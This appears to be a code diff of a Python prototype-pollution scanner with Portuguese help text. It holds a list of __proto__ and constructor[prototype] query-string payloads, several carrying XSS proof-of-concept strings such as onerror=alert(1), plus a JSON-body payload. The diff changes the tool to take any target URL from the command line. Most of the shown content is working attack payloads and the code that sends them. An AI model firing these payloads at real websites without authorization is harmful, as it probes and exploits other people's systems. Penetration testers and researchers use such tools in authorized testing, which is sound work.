@@ -5,7 +5,7 @@ import sys
 import time
 
 
-url = "https://google.com/?="
+
 
 
 payloads = [
@@ -19,7 +19,7 @@ payloads = [
     "?constructor[prototype][test]=test",
     "?__proto__[NUMBER]=test",
     "?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>",
-    "	?__proto__[context]=<img/src/onerror%3dalert(1)>",
+    "?__proto__[context]=<img/src/onerror%3dalert(1)>",
     "&__proto__[jquery]=x",
     "?__proto__[url][]=data:,alert(1)//",
     "&__proto__[dataType]=script",
@@ -123,23 +123,15 @@ payloads_js = [{"__proto__": {"polluted": "true"}},
 
 
 
-parser = argparse.ArgumentParser(description='Para usar enviando na url como payload logo apos o ?= use o -u | se não use o -j para enviar como json no corpo')
-
-parser.add_argument("-u", "--url", help="Enviar Payload na url", action="store_true")
+parser = argparse.ArgumentParser(description='Para usar enviando na url como payload logo apos o ?= use o -p | se não use o -j para enviar como json no corpo')
+parser.add_argument("-u", "--url", required=True, help="Coloque a url")
+parser.add_argument("-p", "--pay", help="Enviar Payload na url",action="store_true")
 parser.add_argument("-j", "--json", help="Enviar payload em formato json", action="store_true")
 
 args = parser.parse_args()
+url = args.url
 
 
-
-
-
-
-
-# ler as urls passdas pelo usuario em um arquivo
-def read_urls_from_file(file_path):
-    with open(file_path, 'r') as file:
-        return [line.strip() for line in file]
 
 
 
@@ -179,7 +171,7 @@ def test_prototype_pollution2(url, payloads_js):
 
 
 
-if args.url:
+if args.pay:
     
     test_prototype_pollution(url,payloads)
 
